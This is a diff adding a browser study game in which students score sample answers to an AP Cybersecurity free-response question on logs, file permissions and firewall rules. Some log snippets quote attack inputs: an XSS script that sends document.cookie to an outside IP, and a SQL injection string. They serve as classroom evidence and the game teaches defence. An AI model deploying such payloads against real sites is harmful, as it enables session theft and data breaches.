@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Point / No Point · The Reading Room</title>
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=Courier+Prime:wght@400;700&family=Libre+Baskerville:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{--desk:#3b2a1e;--desk2:#4a3526;--paper:#f6eedb;--manila:#e8d3a2;--ink:#2a2420;--red:#b3261e;--green:#2f6b3a;--lamp:rgba(255,222,150,.18)}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Libre Baskerville',serif;color:var(--ink);min-height:100vh;
+  background:radial-gradient(ellipse at 50% 0%,var(--lamp),transparent 60%),repeating-linear-gradient(92deg,var(--desk) 0 18px,var(--desk2) 18px 22px,var(--desk) 22px 60px)}
+a.back{position:fixed;top:14px;left:16px;color:#f6eedb;font-family:'Courier Prime',monospace;text-decoration:none;font-size:14px;opacity:.85;z-index:5}
+a.back:hover{opacity:1;text-decoration:underline}
+.wrap{max-width:1020px;margin:0 auto;padding:54px 20px 40px}
+.folder{background:var(--manila);border-radius:6px 6px 4px 4px;padding:22px;position:relative;box-shadow:0 18px 40px rgba(0,0,0,.45)}
+.folder:before{content:'';position:absolute;top:-22px;left:26px;width:290px;height:24px;background:var(--manila);border-radius:8px 8px 0 0}
+.folder .tab{position:absolute;top:-18px;left:40px;font-family:'Special Elite';font-size:13px;letter-spacing:.1em}
+.sheet{background:var(--paper);padding:30px 34px;border:1px solid #d9caa6;box-shadow:2px 3px 0 #cdbb92;position:relative;min-height:440px}
+h1{font-family:'Special Elite';font-size:40px;letter-spacing:.04em}
+h1 span{color:var(--red)}
+.sub{font-family:'Courier Prime';font-size:15px;margin:6px 0 20px;color:#5b4f40}
+p{line-height:1.6;margin:10px 0}
+.btn{font-family:'Special Elite';font-size:18px;padding:12px 22px;border:3px solid var(--ink);background:transparent;cursor:pointer;letter-spacing:.06em}
+.btn:hover{background:var(--ink);color:var(--paper)}
+.btn.primary{background:var(--red);color:#fff;border-color:var(--red)}
+.hud{display:flex;justify-content:space-between;font-family:'Courier Prime';font-size:14px;border-bottom:2px dashed #bfae86;padding-bottom:10px;margin-bottom:16px}
+.part{font-family:'Special Elite';font-size:15px;color:var(--red);letter-spacing:.08em}
+.prompt{font-weight:700;margin:6px 0 12px;line-height:1.5}
+.snip{font-family:'Courier Prime';font-size:13.5px;background:#ece2c8;border-left:4px solid #a48b5a;padding:10px 12px;white-space:pre-wrap;margin-bottom:14px}
+.resp{font-family:'Courier Prime';font-size:17px;line-height:1.55;background:#fffaf0;border:1px solid #d9caa6;padding:16px 18px;position:relative;
+  background-image:repeating-linear-gradient(transparent 0 25px,#e7dcc2 25px 26px)}
+.resp:before{content:'STUDENT RESPONSE';position:absolute;top:-10px;left:12px;background:var(--paper);font-size:11px;letter-spacing:.2em;padding:0 6px;color:#8a7a5c}
+.stamps{display:flex;gap:18px;margin:22px 0 8px}
+.stamp{font-family:'Special Elite';font-size:26px;padding:12px 26px;border:5px double currentColor;background:transparent;cursor:pointer;transform:rotate(-2deg);transition:transform .12s}
+.stamp.pt{color:var(--green)} .stamp.np{color:var(--red)}
+.stamp:hover{transform:rotate(-2deg) scale(1.06)} .stamp.sel{background:currentColor}.stamp.sel span{color:#fff}
+.reasons{display:none;margin-top:12px}
+.reasons.show{display:block}
+.reasons h4{font-family:'Special Elite';font-weight:400;margin-bottom:8px}
+.chip{display:inline-block;font-family:'Courier Prime';font-size:14px;border:2px solid var(--ink);padding:7px 11px;margin:0 8px 8px 0;cursor:pointer;background:#fffaf0}
+.chip:hover{background:#efe3c4} .chip.sel{background:var(--ink);color:var(--paper)}
+.verdict{display:none;margin-top:18px;padding:14px 16px;border:2px solid var(--ink);background:#fff8e6}
+.verdict.show{display:block}
+.verdict .big{font-family:'Special Elite';font-size:22px}
+.big.ok{color:var(--green)} .big.half{color:#9a6a00} .big.no{color:var(--red)}
+.slam{position:absolute;right:40px;top:120px;font-family:'Special Elite';font-size:52px;border:7px double;padding:6px 18px;transform:rotate(-14deg) scale(2);opacity:0;pointer-events:none;transition:all .25s cubic-bezier(.5,1.8,.6,1)}
+.slam.on{opacity:.85;transform:rotate(-14deg) scale(1)}
+.opt{display:block;width:100%;text-align:left;font-family:'Courier Prime';font-size:15.5px;line-height:1.45;padding:12px 14px;margin:8px 0;border:2px solid var(--ink);background:#fffaf0;cursor:pointer}
+.opt:hover{background:#efe3c4}.opt.right{background:#d8ecd6;border-color:var(--green)}.opt.wrong{background:#f4d3cf;border-color:var(--red)}
+table.rep{width:100%;border-collapse:collapse;font-family:'Courier Prime';font-size:14.5px;margin:12px 0}
+table.rep td,table.rep th{border-bottom:1px solid #cdbb92;padding:7px 6px;text-align:left}
+.score{font-family:'Special Elite';font-size:64px;color:var(--red)}
+input[type=text]{font-family:'Courier Prime';font-size:17px;padding:8px 10px;border:2px solid var(--ink);background:#fffaf0;width:260px}
+@media print{body{background:#fff}.back,.noprint{display:none!important}.folder{box-shadow:none;background:#fff}.folder:before{display:none}.sheet{border:0;box-shadow:none}}
+</style>
+</head>
+<body>
+<a class="back" href="../index.html">← Back to the FRQ Funhouse</a>
+<div class="wrap"><div class="folder"><div class="tab">AP READING · CYBERSECURITY</div><div class="sheet" id="app"></div></div></div>
+<script src="../shared/common.js"></script>
+<script>
+const REASONS=[
+ ['R1','No evidence cited from the sources'],
+ ['R2','Names or describes, but never explains'],
+ ['R3','Hedged: more than one answer, one is wrong'],
+ ['R4','Broke the "Other than…" rule in the prompt'],
+ ['R5','Missing the file name or an exact detail'],
+ ['R6','Misread the source'],
+ ['R7','Added a new rule instead of modifying one'],
+ ['R8','Command syntax is wrong']
+];
+const RN=Object.fromEntries(REASONS);
+const ITEMS=[
+{part:'B (ii) · Identify',prompt:'Identify the IP address of the adversary in the password attack.',snip:'Source 2, lines 4–13: FAIL LOGIN: Client "198.51.100.77", user "admin" … "test"\nSource 2, line 14: Accepted password for rkhan from 10.20.0.31',resp:'198.51.100.77 and 10.20.0.31',pt:false,r:'R3',why:'Two IPs were given and one is wrong (10.20.0.31 is a normal successful login). Readers score "one answer" prompts by the whole answer, so the hedge costs the point.'},
+{part:'B (ii) · Identify',prompt:'Identify the IP address of the adversary in the password attack.',snip:'Source 2, lines 4–13: FAIL LOGIN: Client "198.51.100.77", user "admin" … "test"',resp:'198.51.100.77',pt:true,why:'One full, correct IP. Identify needs no explanation.'},
+{part:'A (i) · Explain',prompt:'Explain how one part of the policy helps protect the device.',snip:'Source 6, item 4: USB storage devices may not be connected to clinic devices.',resp:'Item 4 says USB drives can\'t be plugged in. That is a good rule for the clinic.',pt:false,r:'R2',why:'It restates the policy and calls it "good" but never says HOW it protects the device (e.g., blocking malware on drives the clinic doesn\'t control).'},
+{part:'A (i) · Explain',prompt:'Explain how one part of the policy helps protect the device.',snip:'Source 6, item 5: Remote connections to clinic systems must use the clinic VPN.',resp:'Item 5 requires remote connections to use the clinic VPN. This protects the device because only authorized VPN users can reach the server, so someone on the open internet can\'t connect to it directly.',pt:true,why:'Names the item AND gives the protective reason with "because…".'},
+{part:'A (ii) · Explain',prompt:'Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example.',snip:'Source 6 has six items (passwords, screen lock, manual updates, USB, VPN, personal email).',resp:'They should add a new rule that bans social media at work so employees can\'t get phished.',pt:false,r:'R7',why:'The prompt says MODIFY one rule in the current policy. A brand-new rule doesn\'t earn the point, even if it\'s a decent idea.'},
+{part:'A (ii) · Explain',prompt:'Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example.',snip:'Source 6, item 1: Passwords must be at least 8 characters long.',resp:'Item 1 could be changed to require at least 14 characters. Longer passwords take far longer to crack, which makes a password attack like the one in Source 2 much less likely to succeed.',pt:true,why:'Modifies an existing item with a specific change and explains why it is more secure.'},
+{part:'B (i) · Describe',prompt:'Describe evidence of a password attack in the authentication log. Include specific entries from the log.',snip:'Source 2, lines 4–13: ten FAIL LOGIN entries from 198.51.100.77, 08:14:30–08:14:35',resp:'There was a password attack because a lot of logins failed.',pt:false,r:'R1',why:'No specific entries: no line numbers, no IP, no timestamps. The prompt literally says to include entries from the log.'},
+{part:'C (i) · Explain',prompt:'Explain how the permission settings for one file determine access for the owner, group, and others. Include the file name.',snip:'Source 5: -rw-rw-rw-  clinic  staff  patients.csv',resp:'The owner can read and write, the group can read and write, and all other users can read and write because every set is rw-.',pt:false,r:'R5',why:'The reading is right, but which file? The prompt requires the file name, and the decision rules say a missing file name earns nothing.'},
+{part:'C (i) · Explain',prompt:'Explain how the permission settings for one file determine access for the owner, group, and others. Include the file name.',snip:'Source 5: -rw-------  tlee  tlee  api.key',resp:'For api.key (rw-------), the owner tlee can read and write, and the group can read it.',pt:false,r:'R6',why:'Misread the bits: the group set is --- (no access). It also skips "others." Misreading the permission string is an automatic no-point.'},
+{part:'C (ii) · Describe',prompt:'Other than removing all permissions from all users, describe one way to restrict access to one file. Include the file name.',snip:'Source 5: -rw-rw-rw-  clinic  staff  patients.csv',resp:'Remove all permissions from patients.csv so nobody can see the patient records.',pt:false,r:'R4',why:'The prompt starts with "Other than removing all permissions…". That exact answer is ruled out.'},
+{part:'C (iii) · Write',prompt:'Write one or more chmod commands that set the permissions you described (remove read and write for others on patients.csv).',snip:'Source 5: -rw-rw-rw-  patients.csv',resp:'chmod -rw-rw---- patients.csv',pt:false,r:'R8',why:'chmod doesn\'t take a full permission string. Valid options: chmod 660 patients.csv or chmod o-rw patients.csv.'},
+{part:'C (iii) · Write',prompt:'Write one or more chmod commands that set the permissions you described (remove read and write for others on patients.csv).',snip:'Source 5: -rw-rw-rw-  patients.csv',resp:'sudo chmod o-rw patients.csv',pt:true,why:'Valid symbolic syntax and it matches the description. sudo is optional and allowed.'},
+{part:'D (i) · Explain',prompt:'Explain how one connection attempt was blocked by the device\'s firewall. Include evidence from a log file.',snip:'Source 3, line 1: [UFW ALLOW] SRC=203.0.113.50 DPT=22\nSource 3, line 5: [UFW BLOCK] SRC=172.16.5.25 DPT=8080',resp:'The SSH password attack from 203.0.113.50 was blocked by the firewall.',pt:false,r:'R6',why:'Source 3 line 1 shows that traffic was ALLOWED (rule 3 allows SSH from anyone). The failed logins were wrong passwords, not the firewall.'},
+{part:'D (i) · Explain',prompt:'Explain how one connection attempt was blocked by the device\'s firewall. Include evidence from a log file.',snip:'Source 3, line 6: [UFW BLOCK] SRC=10.20.0.31 DPT=8443\nSource 1, rule 7: Deny ALL ALL Inbound ALL',resp:'Source 3 line 6 shows a blocked connection from 10.20.0.31 to port 8443. No rule above allows port 8443, so the traffic reaches rule 7, which denies all other inbound traffic.',pt:true,why:'Log line + the rule responsible + why it applies. That is the full explanation.'},
+{part:'D (ii) · Describe',prompt:'Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection in D (i).',snip:'D (i) answer: 172.16.5.25 was blocked on port 8080.',resp:'Turn off the firewall so the connection can go through.',pt:false,r:'R4',why:'Disabling the firewall = allowing all traffic for all services, which the prompt rules out. Change one rule (e.g., rule 5 port 5432 → 8080).'},
+{part:'D (iii) · Describe',prompt:'Other than allowing the connection attempt identified in D (i), describe one impact of your modification on network traffic.',snip:'D (ii) answer: change rule 5\'s port from 5432 to 8080.',resp:'It would allow 172.16.5.25 to connect on port 8080.',pt:false,r:'R4',why:'"Other than allowing the connection…" The point is for a side effect, like PostgreSQL on 5432 now being blocked by rule 7.'},
+{part:'E (i) · Determine',prompt:'Apart from the password attack, determine the type of attack evidenced in a log file.',snip:'Source 4, line 6: GET /news/comment?msg=<script>fetch(\'http://198.51.100.200/c?\'+document.cookie)<\/script>',resp:'XSS and SQL injection',pt:false,r:'R3',why:'XSS is right, but adding SQL injection (not supported by the logs) makes the answer a hedge. One attack only.'},
+{part:'E (i) · Determine',prompt:'Apart from the password attack, determine the type of attack evidenced in a log file.',snip:'Source 4, line 5: GET /portal/search?patient=\' OR \'1\'=\'1\' --',resp:'SQL injection',pt:true,why:'One attack, correctly determined from the evidence. Determine needs no extra explanation.'},
+{part:'E (ii) · Describe',prompt:'Describe specific information in the log file that indicates the attack named in E (i).',snip:'Source 4, lines 5–6: <script>alert(1)<\/script> and <script>fetch(…document.cookie)<\/script>',resp:'The attacker sent a lot of GET requests to the server, which shows they were trying to hack it.',pt:false,r:'R1',why:'"Lots of requests" is not the specific information. Point to the <script> tags in lines 5–6.'},
+{part:'E (ii) · Describe',prompt:'Describe specific information in the log file that indicates the attack named in E (i).',snip:'Source 4, line 6: GET /news/comment?msg=<script>fetch(\'http://198.51.100.200/c?\'+document.cookie)<\/script>',resp:'Line 6 of Source 4 puts a <script> tag into the msg comment field that sends document.cookie to 198.51.100.200, so any visitor who loads the comment would run the attacker\'s code and leak their session cookie.',pt:true,why:'Specific line, specific malicious input, and what it does.'},
+{part:'E (iv) · Identify',prompt:'This attack could be mitigated by an automated system such as a firewall, IDS, IPS, or AI. Identify a different countermeasure.',snip:'Attack: cross-site scripting in the comment form.',resp:'An IPS could block the attacker.',pt:false,r:'R4',why:'The prompt already listed IPS. "Different countermeasure" means something like input sanitization or output encoding.'}
+];
+const FIXES=[
+{part:'B (i) · Describe',prompt:'Describe evidence of a password attack in the authentication log. Include specific entries.',weak:'Lots of logins failed.',opts:[
+ ['Lines 4–13 of Source 2 show ten failed FTP logins from 198.51.100.77, each for a different username, all within five seconds.',true],
+ ['Many failed logins happened, which is a password attack and very dangerous for the clinic.',false],
+ ['Line 14 shows rkhan logged in, which means the password attack worked.',false]],why:'Only the first adds the specifics: line numbers, the IP, the pattern, and the time window.'},
+{part:'A (i) · Explain',prompt:'Explain how one part of the policy helps protect the device.',weak:'Item 2 requires MFA.',opts:[
+ ['Item 2 requires MFA, which is listed in Source 6 of the policy.',false],
+ ['Item 2 requires MFA for staff email, so even if an attacker steals a password, they still can\'t log in without the second factor.',true],
+ ['MFA is a good idea and most companies use it.',false]],why:'The fix adds the reason: a stolen password alone is not enough to get in.'},
+{part:'C (ii) · Describe',prompt:'Other than removing all permissions, describe one way to restrict access to one file. Include the file name.',weak:'Make deploy.sh safer.',opts:[
+ ['Remove all permissions on deploy.sh.',false],
+ ['Remove the owner\'s execute permission on db.conf.',false],
+ ['Remove write and execute permission for others on deploy.sh so only msantos and the webteam group can change or run it.',true]],why:'Option 1 breaks the "Other than" rule. Option 2 removes a permission db.conf doesn\'t even have (rw-------).'},
+{part:'D (iii) · Describe',prompt:'Other than allowing the connection from D (i), describe one impact of your D (ii) change (rule 4 port 80 → 8443).',weak:'It would let 10.20.0.31 connect.',opts:[
+ ['It would block all adversaries.',false],
+ ['Rule 4 would no longer allow port 80, so normal HTTP traffic to the portal would fall to rule 7 and be blocked.',true],
+ ['It would allow the connection that was blocked before.',false]],why:'The fix describes a real side effect on other traffic, which is what the prompt asks for.'}
+];
+const app=document.getElementById('app');
+let S;
+function start(){
+  const name=(document.getElementById('nm')||{}).value||'';
+  S={name:name.trim(),items:FH.shuffle(ITEMS).slice(0,12),i:0,score:0,max:0,log:[],phase:'stamp',fixI:0,fixScore:0};
+  showItem();
+}
+function title(){
+  app.innerHTML=`<h1>POINT <span>/</span> NO POINT</h1><div class="sub">The Reading Room · AP Cybersecurity Device Security Analysis</div>
+  <p>Welcome to the Reading. You are an AP Reader. Each folder holds one student response to one part of the FRQ.</p>
+  <p><b>Your job:</b> stamp it <b style="color:var(--green)">POINT</b> or <b style="color:var(--red)">NO POINT</b>. If it's NO POINT, name the exact reason, the way a real Reader would.</p>
+  <p>Twelve responses, then a <b>Fix-It</b> round where you choose the rewrite that earns the point.</p>
+  <p style="margin-top:18px">Reader name (for your report): <input type="text" id="nm" placeholder="optional"></p>
+  <p style="margin-top:20px"><button class="btn primary" onclick="start()">BEGIN THE READING</button></p>`;
+}
+function hud(){return `<div class="hud"><span>${S.phase==='fix'?'FIX-IT ROUND '+(S.fixI+1)+' / '+FIXES.length:'RESPONSE '+(S.i+1)+' / '+S.items.length}</span><span>READER ACCURACY: ${S.max?Math.round(S.score/S.max*100):0}%</span></div>`}
+function showItem(){
+  const it=S.items[S.i]; S.pick=null; S.reason=null; S.done=false;
+  app.innerHTML=hud()+`<div class="part">${it.part}</div><div class="prompt">${FH.esc(it.prompt)}</div>
+  <div class="snip">${FH.esc(it.snip)}</div><div class="resp">${FH.esc(it.resp)}</div>
+  <div class="slam" id="slam"></div>
+  <div class="stamps noprint"><button class="stamp pt" onclick="pick(true)"><span>POINT</span></button><button class="stamp np" onclick="pick(false)"><span>NO POINT</span></button></div>
+  <div class="reasons" id="reasons"><h4>Why no point? (pick one)</h4>${REASONS.map(r=>`<span class="chip" data-r="${r[0]}" onclick="why('${r[0]}')">${r[1]}</span>`).join('')}</div>
+  <div class="verdict" id="verdict"></div>`;
+}
+function pick(v){
+  if(S.done) return; S.pick=v;
+  document.querySelectorAll('.stamp').forEach(b=>b.classList.remove('sel'));
+  document.querySelector(v?'.stamp.pt':'.stamp.np').classList.add('sel');
+  if(v){ judge(); } else { document.getElementById('reasons').classList.add('show'); }
+}
+function why(r){ if(S.done) return; S.reason=r; document.querySelectorAll('.chip').forEach(c=>c.classList.toggle('sel',c.dataset.r===r)); judge(); }
+function judge(){
+  const it=S.items[S.i]; S.done=true;
+  let pts=0,label,cls;
+  if(S.pick===it.pt){ if(it.pt||S.reason===it.r){pts=1;label='Calibrated! Your score matches the Reading.';cls='ok';} else {pts=.5;label='Right stamp, wrong reason. Half credit.';cls='half';} }
+  else {label='Off from the Reading.';cls='no';}
+  S.score+=pts;S.max+=1;S.log.push({part:it.part,truth:it.pt?'POINT':'NO POINT ('+RN[it.r]+')',got:pts});
+  const slam=document.getElementById('slam'); slam.textContent=it.pt?'POINT':'NO POINT'; slam.style.color=it.pt?'var(--green)':'var(--red)';
+  requestAnimationFrame(()=>slam.classList.add('on'));
+  const v=document.getElementById('verdict'); v.classList.add('show');
+  v.innerHTML=`<div class="big ${cls}">${label}</div><p><b>Official call:</b> ${it.pt?'POINT':'NO POINT · '+RN[it.r]}</p><p>${FH.esc(it.why)}</p>
+  <button class="btn primary noprint" onclick="next()">${S.i<S.items.length-1?'NEXT FOLDER →':'ON TO FIX-IT →'}</button>`;
+}
+function next(){ if(S.i<S.items.length-1){S.i++;showItem();} else {S.phase='fix';showFix();} }
+function showFix(){
+  const f=FIXES[S.fixI]; S.done=false;
+  const opts=FH.shuffle(f.opts);
+  app.innerHTML=hud()+`<div class="part">${f.part} · NO POINT</div><div class="prompt">${FH.esc(f.prompt)}</div>
+  <div class="resp">${FH.esc(f.weak)}</div><p style="margin-top:16px"><b>Which rewrite earns the point?</b></p>
+  ${opts.map((o,i)=>`<button class="opt" data-ok="${o[1]}" onclick="fix(this)">${FH.esc(o[0])}</button>`).join('')}<div class="verdict" id="verdict"></div>`;
+}
+function fix(btn){
+  if(S.done) return; S.done=true; const ok=btn.dataset.ok==='true'; const f=FIXES[S.fixI];
+  document.querySelectorAll('.opt').forEach(o=>{if(o.dataset.ok==='true')o.classList.add('right');});
+  if(!ok) btn.classList.add('wrong');
+  S.score+=ok?1:0;S.max+=1;S.fixScore+=ok?1:0;S.log.push({part:'Fix-It · '+f.part,truth:'Rewrite',got:ok?1:0});
+  const v=document.getElementById('verdict');v.classList.add('show');
+  v.innerHTML=`<div class="big ${ok?'ok':'no'}">${ok?'That rewrite earns it.':'Not that one.'}</div><p>${FH.esc(f.why)}</p>
+  <button class="btn primary noprint" onclick="nextFix()">${S.fixI<FIXES.length-1?'NEXT →':'SEE MY READER REPORT →'}</button>`;
+}
+function nextFix(){ if(S.fixI<FIXES.length-1){S.fixI++;showFix();} else report(); }
+function report(){
+  const pct=Math.round(S.score/S.max*100); FH.saveBest('reading',pct);
+  const missed={}; S.items.forEach((it,i)=>{ if(S.log[i].got<1){ const k=it.pt?'Earned the point (you stamped NO POINT)':RN[it.r]; missed[k]=(missed[k]||0)+1; }});
+  const mk=Object.keys(missed);
+  app.innerHTML=`<h1>READER REPORT</h1><div class="sub">${S.name?FH.esc(S.name)+' · ':''}${FH.today()} · Point / No Point</div>
+  <div class="score">${pct}%</div><p>Reader accuracy: ${S.score} of ${S.max} (half credit for the right stamp with the wrong reason). Fix-It: ${S.fixScore} / ${FIXES.length}.</p>
+  <h3 style="font-family:'Special Elite';margin-top:18px">Point-killers to watch in your own writing</h3>
+  ${mk.length?'<ul style="margin:8px 0 0 22px">'+mk.map(k=>`<li>${FH.esc(k)} — missed ${missed[k]}×</li>`).join('')+'</ul>':'<p>None missed. You score like a veteran Reader.</p>'}
+  <table class="rep"><tr><th>Part</th><th>Official call</th><th>You</th></tr>${S.log.map(l=>`<tr><td>${FH.esc(l.part)}</td><td>${FH.esc(l.truth)}</td><td>${l.got===1?'✓':l.got===.5?'½':'✗'}</td></tr>`).join('')}</table>
+  <p class="noprint" style="margin-top:16px"><button class="btn primary" onclick="window.print()">SAVE AS PDF</button> <button class="btn" onclick="title()">NEW READING</button></p>
+  <p class="noprint" style="font-size:13px;color:#6a5d48">Tip: in the print window, choose "Save as PDF" as the destination.</p>`;
+}
+title();
+</script>
+</body>
+</html>
